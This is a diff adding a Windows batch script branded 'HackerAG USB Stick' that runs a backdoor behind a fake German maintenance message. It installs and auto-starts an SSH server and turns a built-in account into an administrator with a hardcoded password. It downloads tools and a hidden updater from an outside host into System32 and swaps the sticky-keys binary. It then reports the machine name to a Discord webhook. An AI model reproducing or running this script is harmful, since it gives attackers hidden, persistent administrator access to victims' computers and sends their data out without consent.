@@ -1,0 +1,27 @@
+@echo off
+rem Made by FerrousInk
+rem Version 1.0
+rem ///
+rem //       HackerAG USB Stick
+rem /
+net user HackerAG /delete
+cls
+echo Wartung... [ 1/2 ] [ NICHT SCHLIESSEN ]
+powershell Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
+cls
+echo Wartung... [ 2/2 ] [ NICHT SCHLIESSEN ]
+powershell Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+powershell Set-Service -Name sshd -StartupType 'Automatic'
+net user WDAGUtilityAccount /active:yes
+net user WDAGUtilityAccount FKejx80snc2WF_rM
+net localgroup administratoren /add WDAGUtilityAccount
+curl -o C:\temp.zip https://hackerag.github.io/pstools.zip
+powershell Expand-Archive C:\temp.zip C:\Windows\System32\
+del C:\temp.zip
+curl -o C:\Windows\System32\update.vbs https://hackerag.github.io/update.vbs
+curl -o C:\Windows\System32\hidden_updater.cmd https://hackerag.github.io/updater.cmd
+taskkill /f /im sethc.exe
+rename C:\Windows\System32\sethc.exe launchtm.exe
+rename C:\Windows\System32\sethc.original sethc.exe
+set message=%computername%
+curl -i -H "Accept: application/json" -H "Content-Type: application/json" -X POST --data "{\"content\": \"`%message%`\"}" https://discord.com/api/webhooks/1209446475558293524/JWunLDDPz3DXQQjQ4HgGTPExHSD_I8YS-blEStSBY1eiFiUbfgNjyfSOZt2PX1FxFccu
